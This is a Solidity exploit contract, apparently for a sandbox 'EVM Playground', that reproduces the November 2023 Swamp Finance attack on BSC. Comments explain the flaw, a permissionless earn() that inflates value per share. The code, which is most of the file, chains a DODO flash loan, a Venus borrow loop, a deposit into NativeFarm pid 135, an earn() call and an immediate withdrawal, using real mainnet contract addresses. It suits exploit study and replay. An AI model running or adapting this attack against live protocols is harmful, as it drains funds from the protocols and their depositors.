// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-11-SwampFinance).
//
// The DeFiHackLabs PoC (test/SwampFinance_exp.sol) runs the whole attack
// inside a Foundry `Test` contract and only uses cheatcodes for fork setup /
// cosmetics: `vm.createSelectFork`, `vm.label` (labeling only), three
// `deal(token, address(this), amount)` calls that seed starting balances
// before the flash loan, and `emit log_named_decimal_uint` (diagnostic
// only). None of those touch the profit path itself, so this file is a
// verbatim copy of the attack logic with the cheatcodes dropped: the three
// `deal()` seed balances move to this config's `setup.steps` (`dealToken`,
// see docs/Troubleshooting-2.md §6), and `deal(address(this), 0)` is a
// no-op for a freshly-deployed contract.
//
// Root cause (Swamp Finance, BSC, ~Nov 2 2023): `StrategyBelt_Token` (the
// Swamp `NativeFarm` pid-135 strategy) auto-compounds `beltBNB` with the
// classic wantLockedTotal/sharesTotal share model. `earn()` is PUBLIC with
// no keeper gate and no cooldown: it harvests pending BELT rewards and
// credits them straight into `wantLockedTotal` via `_farm()` with NO new
// shares minted. So whoever holds shares at the instant `earn()` fires
// captures the harvest pro-rata -- including an attacker who deposited one
// call earlier. The attacker: (1) takes a DODO (DPP) flash loan of 3,100
// WBNB + 150,000 BUSDT, (2) loops through Venus (mint vUSDT collateral,
// borrow 500 BNB) to build ~3,600 WBNB of working capital, (3) wraps it into
// beltBNB and deposits into NativeFarm pid 135 to acquire ~75% of the
// strategy's outstanding shares, (4) calls the permissionless `earn()` to
// crystallise pending BELT-farm rewards into `wantLockedTotal` right now,
// (5) immediately withdraws everything at the freshly inflated
// value-per-share, and (6) unwinds the Venus loop + repays the DODO flash
// loan in the same transaction -- netting +0.548 WBNB per cycle with zero
// starting capital.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IWBNB {
    function approve(address guy, uint256 wad) external returns (bool);
    function transfer(address dst, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IbeltBNB {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function deposit(uint256 _amount, uint256 _minShares) external;
    function withdraw(uint256 _shares, uint256 _minAmount) external;
}

interface INativeFarm {
    function deposit(uint256 _pid, uint256 _wantAmt) external;
    function withdraw(uint256 _pid, uint256 _wantAmt) external;
}

interface IStrategyBeltToken {
    function earn() external;
}

interface ICointroller {
    function enterMarkets(address[] memory rTokens) external returns (uint256[] memory);
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface ICrBNB {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

// Entry point: plays the role of the DeFiHackLabs `Test` contract (attacker
// EOA equivalent -- it is both the DODO flash-loan receiver and the holder
// of every intermediate balance). Every step below is copied verbatim from
// test/SwampFinance_exp.sol.
contract SwampFinanceExploit {
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IbeltBNB private constant beltBNB = IbeltBNB(0xa8Bb71facdd46445644C277F9499Dd22f6F0A30C);
    DVM private constant DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ICointroller private constant VenusDistribution = ICointroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    ICErc20Delegate private constant vUSDT = ICErc20Delegate(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    ICrBNB private constant vBNB = ICrBNB(payable(0xA07c5b74C9B40447a954e1466938b865b6BBea36));
    INativeFarm private constant NativeFarm = INativeFarm(0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3);
    IStrategyBeltToken private constant StrategyBeltToken =
        IStrategyBeltToken(0xdA937DDD1F2bd57F507f5764a4F9550c750F7B31);

    // step 0: take the DODO flash loan (3,100 WBNB + 150,000 BUSDT). Every
    // subsequent step runs inside the DPPFlashLoanCall callback. Starting
    // balances (1e15 WBNB, 155,049,710,721,328,089 BUSDT wei, 1,272,113,372,028,660
    // beltBNB wei) are seeded by this config's `setup.steps` instead of the
    // original test's `deal()` calls.
    function run() external {
        DPPOracle.flashLoan(3100e18, 150_000e18, address(this), bytes("_"));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        approveAll();
        address[] memory vTokens = new address[](2);
        vTokens[0] = address(vUSDT);
        vTokens[1] = address(vBNB);
        VenusDistribution.enterMarkets(vTokens);

        uint256 cachedBUSDTbalance = BUSDT.balanceOf(address(this));
        vUSDT.mint(cachedBUSDTbalance);
        vBNB.borrow(500 ether);
        WBNB.deposit{value: address(this).balance}();
        beltBNB.deposit(WBNB.balanceOf(address(this)), 1);
        NativeFarm.deposit(135, beltBNB.balanceOf(address(this)));
        StrategyBeltToken.earn();
        NativeFarm.withdraw(135, type(uint256).max);
        beltBNB.withdraw(beltBNB.balanceOf(address(this)), 1);
        WBNB.withdraw(500 ether);
        vBNB.repayBorrow{value: 500 ether}();
        vUSDT.redeemUnderlying(cachedBUSDTbalance);

        WBNB.transfer(address(DPPOracle), baseAmount);
        BUSDT.transfer(address(DPPOracle), quoteAmount);
    }

    receive() external payable {}

    function approveAll() private {
        BUSDT.approve(address(vUSDT), type(uint256).max);
        WBNB.approve(address(beltBNB), type(uint256).max);
        beltBNB.approve(address(NativeFarm), type(uint256).max);
        beltBNB.approve(address(beltBNB), type(uint256).max);
    }
}
